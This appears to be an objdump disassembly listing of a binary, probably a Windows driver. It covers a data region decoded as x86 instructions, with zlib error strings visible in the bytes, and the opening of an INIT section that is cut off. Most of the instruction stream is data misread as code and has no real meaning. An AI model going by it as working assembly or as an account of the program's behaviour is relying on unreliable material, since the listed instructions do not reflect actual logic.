   1e797:	ficom  WORD PTR [ebx+eax*8]
   1e79a:	inc    esi
   1e79b:	cdq    
   1e79c:	cwde   
   1e79d:	les    esp,FWORD PTR [ebx+0x95c9998]
   1e7a3:	adc    al,0x52
   1e7a5:	mov    eax,ds:0x53360c9a
   1e7aa:	pop    ebx
   1e7ab:	fcomp  DWORD PTR [edi-0x5ea918f1]
   1e7b1:	neg    DWORD PTR [eax]
   1e7b3:	test   eax,0x281cd83a
   1e7b8:	pushaw 
   1e7ba:	jo     0x1e815
   1e7bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
   1e7bd:	cmp    al,BYTE PTR [ebp-0x33]
   1e7c0:	adc    DWORD PTR [eax+eax*1+0x101a6ecc],ebp
   1e7c7:	or     BYTE PTR [eax],al
   1e7c9:	inc    edx
   1e7ca:	dec    edx
   1e7cb:	or     BYTE PTR [eax],al
   1e7cd:	add    BYTE PTR [ebx-0x7623b4e2],ch
   1e7d3:	mov    eax,ds:0x2a5cf20c
   1e7d8:	cwde   
   1e7d9:	int    0xf9
   1e7db:	je     0x1e859
   1e7dd:	enter  0x8bca,0x70
   1e7e1:	push   esp
   1e7e2:	cld    
   1e7e3:	outs   dx,DWORD PTR ds:[esi]
   1e7e4:	dec    ebx
   1e7e5:	gs mov dh,bl
   1e7e8:	cld    
   1e7e9:	enter  0x69d5,0x5a
   1e7ed:	inc    esi
   1e7ee:	punpckldq mm2,mm4
   1e7f1:	test   al,0xab
   1e7f3:	pop    esp
   1e7f4:	and    BYTE PTR [edi-0x3e],dl
   1e7f7:	imul   edi,DWORD PTR [edx-0x5360890c],0xffffffe7
   1e7fe:	dec    ecx
   1e7ff:	pop    ds
   1e800:	test   eax,0x38661ac7
   1e805:	add    BYTE PTR [eax+eax*1+0xf],bl
   1e809:	add    BYTE PTR [edx],ch
   1e80b:	add    BYTE PTR [edx],cl
   1e80d:	add    BYTE PTR [edi],al
   1e80f:	add    BYTE PTR [ecx],dl
   1e811:	add    BYTE PTR [eax],cl
   1e813:	add    BYTE PTR [edi],bh
   1e815:	add    BYTE PTR ds:0x1b000000,bh
   1e81b:	add    BYTE PTR [eax],ch
   1e81d:	add    BYTE PTR [edi],ch
   1e81f:	add    BYTE PTR [edx],cl
   1e821:	add    BYTE PTR [edx],cl
   1e823:	add    BYTE PTR [edi],al
   1e825:	add    BYTE PTR [ecx],dl
   1e827:	add    BYTE PTR [eax],cl
   1e829:	add    BYTE PTR [esi+0x0],bl
   1e82c:	add    DWORD PTR [eax],eax
   1e82e:	outs   dx,BYTE PTR ds:[esi]
   1e82f:	add    BYTE PTR [eax],al
   1e831:	add    BYTE PTR [edx-0x3303ff4b],dh
   1e837:	inc    ebp
   1e838:	imul   edx,DWORD PTR [ecx+eiz*1-0x1220bc5b],0x1f7b8a11
   1e843:	add    esi,DWORD PTR [ecx+0x6a]
   1e846:	xchg   ebp,eax
   1e847:	sbb    bh,BYTE PTR [edi]
   1e849:	call   0x726f7bbb
   1e84e:	fst    QWORD PTR [edx+0x6e5a5070]
   1e854:	add    ah,cl
   1e856:	std    
   1e857:	add    DWORD PTR [ebp+0x525b9f88],ebp
   1e85d:	push   ebx
   1e85e:	ror    ch,0xf0
   1e861:	sbb    dl,bl
   1e863:	sbb    DWORD PTR [eax+0x3b],edi
   1e866:	sar    ah,1
   1e868:	into   
   1e869:	mul    BYTE PTR [edi-0x65]
   1e86c:	push   eax
   1e86d:	int3   
   1e86e:	sub    edx,DWORD PTR [eax-0x4c]
   1e871:	jo     0x1e84b
   1e873:	ret    
   1e874:	repz (bad) 
   1e876:	cmc    
   1e877:	pop    ds
   1e878:	push   es
   1e879:	cdq    
   1e87a:	xchg   esp,eax
   1e87b:	outs   dx,BYTE PTR ds:[esi]
   1e87c:	gs jne 0x1e85d
   1e87f:	js     0x1e8d2
   1e881:	add    BYTE PTR [esi+0x42],dl
   1e884:	popa   
   1e885:	outs   dx,BYTE PTR ds:[esi]
   1e886:	stos   BYTE PTR es:[di],al
   1e888:	and    DWORD PTR [ecx-0x5e28eb8c],edi
   1e88e:	test   eax,0x48d93749
   1e893:	mov    ss,WORD PTR [ebx]
   1e895:	scas   eax,DWORD PTR es:[edi]
   1e896:	cmc    
   1e897:	xor    BYTE PTR [ecx-0x3b],dh
   1e89a:	jmp    DWORD PTR [ebx]
   1e89c:	xchg   esp,eax
   1e89d:	inc    ecx
   1e89e:	push   ebx
   1e89f:	aam    0x77
   1e8a1:	std    
   1e8a2:	push   eax
   1e8a3:	je     0x1e8a5
   1e8a5:	int3   
   1e8a6:	add    BYTE PTR cs:[ebp+0x0],bl
   1e8aa:	or     al,BYTE PTR [eax]
   1e8ac:	or     al,BYTE PTR [eax]
   1e8ae:	add    BYTE PTR [eax],al
   1e8b0:	xlat   BYTE PTR ds:[ebx]
   1e8b1:	icebp  
   1e8b2:	adc    al,0x51
   1e8b4:	mov    bh,0x73
   1e8b6:	aaa    
   1e8b7:	fisubr DWORD PTR [ebp-0x66]
   1e8ba:	idiv   BYTE PTR [eax+ebx*2-0x3caafdcc]
   1e8c1:	aad    0x82
   1e8c3:	mov    ch,0x59
   1e8c5:	ja     0x1e8a5
   1e8c7:	jno    0x1e8e2
   1e8c9:	jp     0x1e878
   1e8cb:	and    BYTE PTR [edi-0x42],0x33
   1e8cf:	pop    ds
   1e8d0:	adc    al,0x44
   1e8d2:	mov    bl,0xe
   1e8d4:	aas    
   1e8d5:	jecxz  0x1e8ca
   1e8d7:	mov    ds:0xa1c89871,al
   1e8dc:	jne    0x1e901
   1e8de:	add    ah,cl
   1e8e0:	xor    BYTE PTR [ebx+0xd1698f0],al
   1e8e6:	xor    ebx,DWORD PTR [esi-0x6c]
   1e8e9:	jl     0x1e916
   1e8eb:	test   al,0x89
   1e8ed:	js     0x1e91e
   1e8ef:	jo     0x1e92f
   1e8f1:	inc    edx
   1e8f2:	xor    esp,ebp
   1e8f4:	or     edi,DWORD PTR [edi+0x73b1a5b4]
   1e8fa:	push   eax
   1e8fb:	sub    ch,dh
   1e8fd:	xor    eax,0xff748920
   1e902:	adc    BYTE PTR [ebx+eax*4+0x23],0xa7
   1e907:	ss iret 
   1e909:	(bad)  
   1e90a:	sub    DWORD PTR [esp+edi*1-0x5d],ecx
   1e90e:	or     bh,BYTE PTR [ecx+esi*1]
   1e911:	or     al,0x35
   1e913:	jno    0x1e90e
   1e915:	adc    bh,BYTE PTR [eax+0x5ef5affb]
   1e91b:	mov    eax,0x5f940c
   1e920:	pop    esp
   1e921:	add    BYTE PTR [edi],cl
   1e923:	add    BYTE PTR [edx],ch
   1e925:	add    BYTE PTR [edx],cl
   1e927:	add    BYTE PTR [edi],al
   1e929:	add    BYTE PTR [ecx],dl
   1e92b:	add    BYTE PTR [eax],cl
   1e92d:	add    BYTE PTR [edi],bh
   1e92f:	add    BYTE PTR ds:0x1b000000,bh
   1e935:	add    BYTE PTR [eax],al
   1e937:	add    al,bl
   1e939:	std    
   1e93a:	int3   
   1e93b:	sbb    BYTE PTR [eax],bl
   1e93d:	pop    edi
   1e93e:	cmp    ah,bl
   1e940:	or     eax,0xe63cb65b
   1e945:	imul   edi,DWORD PTR [ecx+esi*8],0x9391e796
   1e94c:	mov    ecx,0x22f66851
   1e951:	js     0x1e9c1
   1e953:	mov    ds:0xbcb2ea2c,eax
   1e958:	outs   dx,DWORD PTR ds:[esi]
   1e959:	mov    dl,0x25
   1e95b:	mov    ch,0x56
   1e95d:	dec    ecx
   1e95e:	jge    0x1e98f
   1e960:	mov    dh,0xe4
   1e962:	mov    esi,0xa21043fc
   1e967:	test   esp,eax
   1e969:	pop    es
   1e96a:	xor    al,0xff
   1e96c:	mov    ebp,0x2d5b84d9
   1e971:	mov    ecx,0x26c5bd
   1e976:	pop    esp
   1e977:	add    BYTE PTR [esi],cl
   1e979:	add    BYTE PTR [edi],dh
   1e97b:	add    BYTE PTR [edx],al
   1e97d:	add    BYTE PTR [esi],cl
   1e97f:	add    BYTE PTR [edx],bl
   1e981:	add    BYTE PTR [edi],al
   1e983:	add    BYTE PTR [esi],al
   1e985:	add    BYTE PTR [ebx],cl
   1e987:	add    BYTE PTR ds:0x2c001100,ah
   1e98d:	add    BYTE PTR [edx],al
   1e98f:	add    BYTE PTR [ebx],cl
   1e991:	add    BYTE PTR [ecx],al
   1e993:	add    BYTE PTR [edi],al
   1e995:	add    BYTE PTR [ebx],cl
   1e997:	add    BYTE PTR [ecx],bh
   1e999:	add    BYTE PTR [edi],cl
   1e99b:	add    BYTE PTR [edx],cl
   1e99d:	add    BYTE PTR [edx],cl
   1e99f:	add    BYTE PTR [edi],al
   1e9a1:	add    BYTE PTR [ecx],dl
   1e9a3:	add    BYTE PTR [eax],cl
   1e9a5:	add    BYTE PTR [ecx],dl
   1e9a7:	add    BYTE PTR [edi],bl
   1e9a9:	add    BYTE PTR [esi],dh
   1e9ab:	add    BYTE PTR [edi],al
   1e9ad:	add    BYTE PTR [eax],al
   1e9af:	add    BYTE PTR [edi],dl
   1e9b1:	add    BYTE PTR [ebx],cl
   1e9b3:	add    BYTE PTR [edx],bl
   1e9b5:	add    BYTE PTR [edi],dh
   1e9b7:	add    BYTE PTR [eax+eax*1],ch
   1e9ba:	add    DWORD PTR [eax],eax
   1e9bc:	sbb    al,BYTE PTR [eax]
   1e9be:	push   es
   1e9bf:	add    BYTE PTR ds:0x3f000300,bl
   1e9c5:	add    BYTE PTR [esi],dh
   1e9c7:	add    BYTE PTR [ecx],dl
   1e9c9:	add    BYTE PTR [eax],ch
   1e9cb:	add    BYTE PTR [edi],cl
   1e9cd:	add    BYTE PTR [esi],dh
   1e9cf:	add    BYTE PTR [edi],dl
   1e9d1:	add    BYTE PTR [eax+eax*1],al
   1e9d4:	pop    ds
   1e9d5:	add    BYTE PTR [edx],cl
   1e9d7:	add    BYTE PTR [esi],al
   1e9d9:	add    BYTE PTR [esi],dl
   1e9db:	add    BYTE PTR [edi],ch
   1e9dd:	add    BYTE PTR [eax],al
   1e9df:	add    BYTE PTR ds:0xc2fd5af3,ch
   1e9e5:	arpl   WORD PTR [esi+ebp*2+0x2a33be56],cx
   1e9ec:	jb     0x1e995
   1e9ee:	mov    cl,0x91
   1e9f0:	jl     0x1ea5a
   1e9f2:	jge    0x1ea4b
   1e9f4:	sub    ah,BYTE PTR [ebx+0x622fb884]
   1e9fa:	xchg   DWORD PTR [esi],ebx
   1e9fc:	pop    es
   1e9fd:	cmp    al,0xc2
   1e9ff:	jle    0x1e998
   1ea01:	ret    
   1ea02:	jmp    0x1ea49
   1ea04:	mov    bl,0xcb
   1ea06:	dec    esi
   1ea07:	xchg   ebp,eax
   1ea08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
   1ea09:	add    BYTE PTR ds:0x6c0003e8,ah
   1ea0f:	add    BYTE PTR [edi],bl
   1ea11:	add    BYTE PTR [edx],dl
   1ea13:	add    BYTE PTR [edx],dl
   1ea15:	add    BYTE PTR [eax],al
   1ea17:	add    BYTE PTR [ebp+0x0],bl
   1ea1a:	dec    ebx
   1ea1b:	add    BYTE PTR ds:0x1d00,bl
   1ea21:	add    BYTE PTR [eax-0x12862889],bl
   1ea27:	jmp    0x6a2c:0xca30c72e
   1ea2e:	and    eax,0xc1ca4444
   1ea33:	js     0x1ea6a
   1ea35:	mov    DWORD PTR [esi],edi
   1ea37:	jbe    0x1ea5e
   1ea39:	fsubr  QWORD PTR [ecx+0x13915a61]
   1ea3f:	gs inc edx
   1ea41:	xchg   BYTE PTR [bx],cl
   1ea44:	and    al,0xd8
   1ea46:	into   
   1ea47:	push   ebp
   1ea48:	xor    BYTE PTR [eax+0x3f426afe],al
   1ea4e:	fs push ebp
   1ea50:	add    ah,cl
   1ea52:	pop    edx
   1ea53:	sub    eax,0x6163725
   1ea58:	sbb    BYTE PTR [eax],cl
   1ea5a:	xor    DWORD PTR [edx+ebx*1],edi
   1ea5d:	pop    ss
   1ea5e:	add    al,0x5
   1ea60:	add    ah,cl
   1ea62:	mov    dh,0xba
   1ea64:	mov    eax,0xf20b439
   1ea69:	shl    dl,0x91
   1ea6c:	xchg   DWORD PTR [ecx+0x18],eax
   1ea6f:	stos   DWORD PTR es:[edi],eax
   1ea70:	push   es
   1ea71:	call   0x48733bd1
   1ea76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
   1ea77:	into   
   1ea78:	out    dx,eax
   1ea79:	cli    
   1ea7a:	mov    esp,0x63326087
   1ea7f:	pop    ds
   1ea80:	pop    esp
   1ea81:	mov    edi,0x9bcdd5f9
   1ea86:	sbb    bl,BYTE PTR [esi-0x74]
   1ea89:	mov    dh,dh
   1ea8b:	hlt    
   1ea8c:	add    edx,DWORD PTR [ebx-0x45]
   1ea8f:	out    0x2c,eax
   1ea91:	cmp    al,bl
   1ea93:	push   ss
   1ea94:	adc    DWORD PTR [ecx],0x5cf80fa9
   1ea9a:	inc    edx
   1ea9b:	dec    edi
   1ea9c:	dec    ebp
   1ea9d:	add    BYTE PTR [esi+0x3a],cl
   1eaa0:	and    esp,DWORD PTR ds:0x33111d1b
   1eaa6:	aas    
   1eaa7:	sbb    eax,DWORD PTR [esi]
   1eaa9:	add    DWORD PTR [ecx*1+0x2082821],edx
   1eab0:	sbb    eax,0x3acc000b
   1eab5:	daa    
   1eab6:	gs clc 
   1eab8:	cwde   
   1eab9:	hlt    
   1eaba:	pop    ebp
   1eabb:	imul   esp,DWORD PTR [ebx-0x3ea28fb6],0xd
   1eac2:	jne    0x1eaad
   1eac4:	pop    esi
   1eac5:	dec    ecx
   1eac6:	les    ecx,FWORD PTR [edx-0x32]
   1eac9:	daa    
   1eaca:	iret   
   1eacb:	push   ecx
   1eacc:	or     bh,BYTE PTR [edx+0x5a]
   1eacf:	repz or ebp,DWORD PTR [esi]
   1ead2:	mov    eax,ds:0xe582bcc0
   1ead7:	scas   al,BYTE PTR es:[edi]
   1ead8:	push   0x79
   1eada:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
   1eadb:	mov    al,0x5e
   1eadd:	lock xchg ebx,eax
   1eadf:	xlat   BYTE PTR ds:[ebx]
   1eae0:	sbb    BYTE PTR [ebx],bl
   1eae2:	retf   
   1eae3:	adc    BYTE PTR ss:[esi+0x4501e777],0x32
   1eaeb:	(bad)  
   1eaec:	xor    al,0xa4
   1eaee:	add    ah,cl
   1eaf0:	pop    edx
   1eaf1:	sub    eax,0x1b1d2227
   1eaf6:	adc    DWORD PTR [esi],eax
   1eaf8:	pop    ss
   1eaf9:	and    bh,BYTE PTR [edi]
   1eafb:	sbb    eax,DWORD PTR [esi]
   1eafd:	add    DWORD PTR [ecx*1+0x2082821],edx
   1eb04:	sbb    eax,0x75cc000b
   1eb09:	retf   
   1eb0a:	xchg   esp,eax
   1eb0b:	pop    edx
   1eb0c:	mov    ebp,0xb4518805
   1eb11:	push   es
   1eb12:	jl     0x1eab3
   1eb14:	leave  
   1eb15:	aam    0x30
   1eb17:	int3   
   1eb18:	cmp    BYTE PTR [edx+0x4ba9cb28],ah
   1eb1e:	pop    es
   1eb1f:	push   ebp
   1eb20:	les    edi,FWORD PTR [edx]
   1eb22:	fcomp  QWORD PTR [ecx]
   1eb24:	pop    ds
   1eb25:	xchg   DWORD PTR [eax+eax*2],edx
   1eb28:	loope  0x1eaac
   1eb2a:	loope  0x1eb21
   1eb2c:	fstp   QWORD PTR ds:0x31ebb9ce
   1eb32:	or     edi,DWORD PTR [eax]
   1eb34:	clc    
   1eb35:	add    BYTE PTR [eax],al
   1eb37:	inc    esp
   1eb38:	dec    esp
   1eb39:	hlt    
   1eb3a:	pop    ss
   1eb3b:	mov    dh,0x88
   1eb3d:	dec    edi
   1eb3e:	arpl   WORD PTR [ebx+0x7a],sp
   1eb41:	les    esi,FWORD PTR [ecx+ebp*8-0x68]
   1eb45:	not    DWORD PTR [edi+0x54]
   1eb48:	stc    
   1eb49:	dec    edx
   1eb4a:	add    al,bh
   1eb4c:	add    cl,dl
   1eb4e:	dec    ecx
   1eb4f:	repz adc ebx,DWORD PTR [ebx]
   1eb52:	pop    eax
   1eb53:	or     eax,ebx
   1eb55:	push   edx
   1eb56:	xor    BYTE PTR [ebx+0x1c],al
   1eb59:	inc    ecx
   1eb5a:	jl     0x1eaf1
   1eb5c:	cmp    al,0x66
   1eb5e:	pop    ds
   1eb5f:	repnz add edx,ecx
   1eb62:	add    ah,cl
   1eb64:	pop    esp
   1eb65:	add    BYTE PTR [eax],bl
   1eb67:	add    BYTE PTR [ebx],ch
   1eb69:	add    BYTE PTR [eax+eax*1],bl
   1eb6c:	aaa    
   1eb6d:	add    BYTE PTR [ecx],ah
   1eb6f:	add    BYTE PTR [ebx],dl
   1eb71:	add    BYTE PTR [edi],bl
   1eb73:	add    BYTE PTR [edx],cl
   1eb75:	add    BYTE PTR [esi],al
   1eb77:	add    BYTE PTR [esi],dl
   1eb79:	add    BYTE PTR [edi],ch
   1eb7b:	add    BYTE PTR [ecx+0x0],bh
   1eb7e:	push   esi
   1eb7f:	add    BYTE PTR [eax],al
   1eb81:	add    BYTE PTR [edx-0x2c0e6265],dh
   1eb87:	fild   WORD PTR [edi]
   1eb89:	add    DWORD PTR [edi],0x231e68e2
   1eb8f:	adc    DWORD PTR [esi+ecx*1+0x66],0x5d350939
   1eb97:	mov    ds:0xec73ff3d,al
   1eb9c:	outs   dx,BYTE PTR ds:[esi]
   1eb9d:	fxch   st(5)
   1eb9f:	nop
   1eba0:	jge    0x1ebbb
   1eba2:	cmp    eax,0x4016b914
   1eba7:	ss push ss
   1eba9:	fiadd  WORD PTR ds:0xf6cb42ed
   1ebaf:	xchg   DWORD PTR [edx+0xf5f6771],ebp
   1ebb5:	jb     0x1ebfd
   1ebb7:	add    ah,BYTE PTR [eax+eax*1+0x18005c]
   1ebbe:	and    DWORD PTR [eax],eax
   1ebc0:	adc    eax,DWORD PTR [eax]
   1ebc2:	pop    ds
   1ebc3:	add    BYTE PTR [edx],cl
   1ebc5:	add    BYTE PTR [esi],al
   1ebc7:	add    BYTE PTR [ecx],bh
   1ebc9:	add    BYTE PTR [ecx+0x0],bh
   1ebcc:	push   esi
   1ebcd:	add    BYTE PTR [eax],al
   1ebcf:	add    bh,cl
   1ebd1:	xor    bh,BYTE PTR [ebp-0x387922c2]
   1ebd7:	aam    0x29
   1ebd9:	xchg   ebx,eax
   1ebda:	mov    ebx,0xc0211770
   1ebdf:	(bad)  
   1ebe0:	std    
   1ebe1:	mov    ebp,0xcdee40aa
   1ebe6:	mov    dl,0xbf
   1ebe8:	sub    DWORD PTR [ecx+0x25192051],0xffffffd5
   1ebef:	adc    edx,0xe758c217
   1ebf5:	in     eax,0x32
   1ebf7:	add    BYTE PTR [ebx+0x0],dl
   1ebfa:	jns    0x1ebfc
   1ebfc:	jae    0x1ebfe
   1ebfe:	inc    ebp
   1ebff:	add    BYTE PTR [esi+0x0],dh
   1ec02:	je     0x1ec04
   1ec04:	inc    ebx
   1ec05:	add    BYTE PTR [eax],al
   1ec07:	add    BYTE PTR [eax+eax*1+0x0],bl
   1ec0b:	add    BYTE PTR [edx+0x0],dh
   1ec0e:	jb     0x1ec10
   1ec10:	add    BYTE PTR [eax],al
   1ec12:	mov    bl,0x36
   1ec14:	pop    esp
   1ec15:	inc    ebx
   1ec16:	loopne 0x1ebfb
   1ec18:	neg    esp
   1ec1a:	pop    ss
   1ec1b:	cmp    DWORD PTR [edi+0x24a8854c],edi
   1ec21:	mov    ebp,DWORD PTR [ecx+0x7]
   1ec24:	int    0x56
   1ec26:	mov    ch,0x99
   1ec28:	popf   
   1ec29:	adc    eax,0x4dba5d8
   1ec2e:	leave  
   1ec2f:	xchg   DWORD PTR [ebp-0x39387032],ebx
   1ec35:	and    ah,BYTE PTR [edi+0x77]
   1ec38:	jbe    0x1ec81
   1ec3a:	das    
   1ec3b:	cmp    ebx,ecx
   1ec3d:	mov    eax,ds:0x2f03bdc4
   1ec42:	add    ecx,edi
   1ec44:	js     0x1ec4b
   1ec46:	mov    cl,0x32
   1ec48:	fsubp  st(3),st
   1ec4a:	into   
   1ec4b:	cvtdq2ps xmm3,XMMWORD PTR [ecx+esi*4]
   1ec4f:	xchg   esp,eax
   1ec50:	add    ah,cl
   1ec52:	and    eax,0x5ccc0053
   1ec57:	add    BYTE PTR [ebx+0x0],dh
   1ec5a:	jns    0x1ec5c
   1ec5c:	jae    0x1ec5e
   1ec5e:	je     0x1ec60
   1ec60:	add    BYTE PTR gs:[ebp+0x0],ch
   1ec64:	jb     0x1ec66
   1ec66:	outs   dx,DWORD PTR ds:[esi]
   1ec67:	add    BYTE PTR [edi+0x0],ch
   1ec6a:	je     0x1ec6c
   1ec6c:	pop    esp
   1ec6d:	add    BYTE PTR [ebx+0x0],dh
   1ec70:	jns    0x1ec72
   1ec72:	jae    0x1ec74
   1ec74:	je     0x1ec76
   1ec76:	add    BYTE PTR gs:[ebp+0x0],ch
   1ec7a:	xor    eax,DWORD PTR [eax]
   1ec7c:	xor    al,BYTE PTR [eax]
   1ec7e:	pop    esp
   1ec7f:	add    BYTE PTR ds:0x5300,ah
   1ec85:	add    BYTE PTR [ecx],dh
   1ec87:	xor    ch,BYTE PTR cs:[esi]
   1ec8a:	xor    eax,DWORD PTR [eax]
   1ec8c:	imul   ebp,DWORD PTR [esi+0x63],0x6572726f
   1ec93:	arpl   WORD PTR [eax+eiz*1+0x6c],si
   1ec97:	outs   dx,BYTE PTR gs:[esi]
   1ec99:	addr16 je 0x1ed04
   1ec9c:	and    BYTE PTR [ebx+0x68],ah
   1ec9f:	arpl   WORD PTR gs:[ebx+0x0],bp
   1eca3:	int3   
   1eca4:	imul   ebp,DWORD PTR [esi+0x63],0x6572726f
   1ecab:	arpl   WORD PTR [eax+eiz*1+0x64],si
   1ecaf:	popa   
   1ecb0:	je     0x1ed13
   1ecb2:	and    BYTE PTR [ebx+0x68],ah
   1ecb5:	arpl   WORD PTR gs:[ebx+0x0],bp
   1ecb9:	int3   
   1ecba:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ecc1:	and    BYTE PTR [ecx+ebp*2+0x73],ah
   1ecc5:	je     0x1ed28
   1ecc7:	outs   dx,BYTE PTR ds:[esi]
   1ecc8:	arpl   WORD PTR [ebp+0x20],sp
   1eccb:	je     0x1ed3c
   1eccd:	outs   dx,DWORD PTR ds:[esi]
   1ecce:	and    BYTE PTR [esi+0x61],ah
   1ecd1:	jb     0x1ecf3
   1ecd3:	bound  esp,QWORD PTR [ecx+0x63]
   1ecd6:	imul   eax,DWORD PTR [eax],0x69
   1ecd9:	outs   dx,BYTE PTR ds:[esi]
   1ecda:	jbe    0x1ed3d
   1ecdc:	ins    BYTE PTR es:[edi],dx
   1ecdd:	imul   esp,DWORD PTR [eax+eiz*1+0x64],0x61747369
   1ece5:	outs   dx,BYTE PTR ds:[esi]
   1ece6:	arpl   WORD PTR [ebp+0x20],sp
   1ece9:	arpl   WORD PTR [edi+0x64],bp
   1ecec:	add    BYTE PTR gs:[ecx+0x6e],ch
   1ecf0:	jbe    0x1ed53
   1ecf2:	ins    BYTE PTR es:[edi],dx
   1ecf3:	imul   esp,DWORD PTR [eax+eiz*1+0x6c],0x72657469
   1ecfb:	popa   
   1ecfc:	ins    BYTE PTR es:[edi],dx
   1ecfd:	das    
   1ecfe:	ins    BYTE PTR es:[edi],dx
   1ecff:	outs   dx,BYTE PTR gs:[esi]
   1ed01:	addr16 je 0x1ed6c
   1ed04:	and    BYTE PTR [ebx+0x6f],ah
   1ed07:	fs add BYTE PTR gs:[ecx+0x6e],ch
   1ed0c:	jbe    0x1ed6f
   1ed0e:	ins    BYTE PTR es:[edi],dx
   1ed0f:	imul   esp,DWORD PTR [eax+eiz*1+0x64],0x61747369
   1ed17:	outs   dx,BYTE PTR ds:[esi]
   1ed18:	arpl   WORD PTR [ebp+0x73],sp
   1ed1b:	and    BYTE PTR [ebx+0x65],dh
   1ed1e:	je     0x1ed20
   1ed20:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed27:	and    BYTE PTR [ecx+ebp*2+0x74],ch
   1ed2b:	gs jb  0x1ed8f
   1ed2e:	ins    BYTE PTR es:[edi],dx
   1ed2f:	das    
   1ed30:	ins    BYTE PTR es:[edi],dx
   1ed31:	outs   dx,BYTE PTR gs:[esi]
   1ed33:	addr16 je 0x1ed9e
   1ed36:	jae    0x1ed58
   1ed38:	jae    0x1ed9f
   1ed3a:	je     0x1ed3c
   1ed3c:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed43:	and    BYTE PTR [edx+0x69],ah
   1ed46:	je     0x1ed68
   1ed48:	ins    BYTE PTR es:[edi],dx
   1ed49:	outs   dx,BYTE PTR gs:[esi]
   1ed4b:	addr16 je 0x1edb6
   1ed4e:	and    BYTE PTR [edx+0x65],dh
   1ed51:	jo     0x1edb8
   1ed53:	popa   
   1ed54:	je     0x1ed56
   1ed56:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed5d:	and    BYTE PTR [ebx+0x6f],ah
   1ed60:	fs and BYTE PTR gs:[ebp+eiz*2+0x6e],ch
   1ed66:	addr16 je 0x1edd1
   1ed69:	jae    0x1ed8b
   1ed6b:	jae    0x1edd2
   1ed6d:	je     0x1ed6f
   1ed6f:	int3   
   1ed70:	je     0x1ede1
   1ed72:	outs   dx,DWORD PTR ds:[esi]
   1ed73:	and    BYTE PTR [ebp+0x61],ch
   1ed76:	outs   dx,BYTE PTR ds:[esi]
   1ed77:	jns    0x1ed99
   1ed79:	ins    BYTE PTR es:[edi],dx
   1ed7a:	outs   dx,BYTE PTR gs:[esi]
   1ed7c:	addr16 je 0x1ede7
   1ed7f:	and    BYTE PTR [edi+0x72],ch
   1ed82:	and    BYTE PTR [ecx+ebp*2+0x73],ah
   1ed86:	je     0x1ede9
   1ed88:	outs   dx,BYTE PTR ds:[esi]
   1ed89:	arpl   WORD PTR [ebp+0x20],sp
   1ed8c:	jae    0x1ee07
   1ed8e:	ins    DWORD PTR es:[edi],dx
   1ed8f:	bound  ebp,QWORD PTR [edi+0x6c]
   1ed92:	jae    0x1ed94
   1ed94:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ed9b:	and    BYTE PTR [ebx+0x74],dh
   1ed9e:	outs   dx,DWORD PTR ds:[esi]
   1ed9f:	jb     0x1ee06
   1eda1:	and    BYTE PTR fs:[edx+0x6c],ah
   1eda5:	outs   dx,DWORD PTR ds:[esi]
   1eda6:	arpl   WORD PTR [ebx+0x20],bp
   1eda9:	ins    BYTE PTR es:[edi],dx
   1edaa:	outs   dx,BYTE PTR gs:[esi]
   1edac:	addr16 je 0x1ee17
   1edaf:	jae    0x1edb1
   1edb1:	int3   
   1edb2:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1edb9:	and    BYTE PTR [edx+0x6c],ah
   1edbc:	outs   dx,DWORD PTR ds:[esi]
   1edbd:	arpl   WORD PTR [ebx+0x20],bp
   1edc0:	je     0x1ee3b
   1edc2:	jo     0x1ee29
   1edc4:	add    ah,cl
   1edc6:	push   0x65646165
   1edcb:	jb     0x1eded
   1edcd:	arpl   WORD PTR [edx+0x63],si
   1edd0:	and    BYTE PTR [ebp+0x69],ch
   1edd3:	jae    0x1ee42
   1edd5:	popa   
   1edd6:	je     0x1ee3b
   1edd8:	push   0x6b6e7500
   1eddd:	outs   dx,BYTE PTR ds:[esi]
   1edde:	outs   dx,DWORD PTR ds:[esi]
   1eddf:	ja     0x1ee4f
   1ede1:	and    BYTE PTR [eax+0x65],ch
   1ede4:	popa   
   1ede5:	fs gs jb 0x1ee09
   1ede9:	data16 ins BYTE PTR es:[edi],dx
   1edeb:	popa   
   1edec:	addr16 jae 0x1ee0f
   1edef:	jae    0x1ee56
   1edf1:	je     0x1edf3
   1edf3:	int3   
   1edf4:	imul   ebp,DWORD PTR [esi+0x63],0x6572726f
   1edfb:	arpl   WORD PTR [eax+eiz*1+0x68],si
   1edff:	gs popa 
   1ee01:	fs gs jb 0x1ee25
   1ee05:	arpl   WORD PTR [eax+0x65],bp
   1ee08:	arpl   WORD PTR [ebx+0x0],bp
   1ee0b:	int3   
   1ee0c:	imul   ebp,DWORD PTR [esi+0x76],0x64696c61
   1ee13:	and    BYTE PTR [edi+0x69],dh
   1ee16:	outs   dx,BYTE PTR ds:[esi]
   1ee17:	outs   dx,DWORD PTR fs:[esi]
   1ee19:	ja     0x1ee3b
   1ee1b:	jae    0x1ee86
   1ee1d:	jp     0x1ee84
   1ee1f:	add    BYTE PTR [ebp+0x6e],dh
   1ee22:	imul   ebp,DWORD PTR [esi+0x6f],0x77
   1ee26:	outs   dx,BYTE PTR ds:[esi]
   1ee27:	and    BYTE PTR [ebx+0x6f],ah
   1ee2a:	ins    DWORD PTR es:[edi],dx
   1ee2b:	jo     0x1ee9f
   1ee2d:	gs jae 0x1eea3
   1ee30:	imul   ebp,DWORD PTR [edi+0x6e],0x74656d20
   1ee37:	.byte 0x68
   1ee38:	outs   dx,DWORD PTR ds:[esi]
   1ee39:	fs
	...

Disassembly of section INIT:

0007fc00 <INIT>:
   7fc00:	add    BYTE PTR [eax],al
   7fc02:	add    BYTE PTR [eax],al
   7fc04:	add    BYTE PTR [ecx+0x7e528],ah
   7fc0a:	mov    ecx,0xbb40e64e
   7fc0f:	test   eax,eax
   7fc11:	je     0x7fc17
   7fc13:	cmp    eax,ecx
   7fc15:	jne    0x7fc31
   7fc17:	mov    eax,ds:0x1f054
   7fc1c:	mov    eax,DWORD PTR [eax]
   7fc1e:	xor    eax,0x7e528
   7fc23:	mov    ds:0x7e528,eax
   7fc28:	jne    0x7fc31
   7fc2a:	mov    eax,ecx
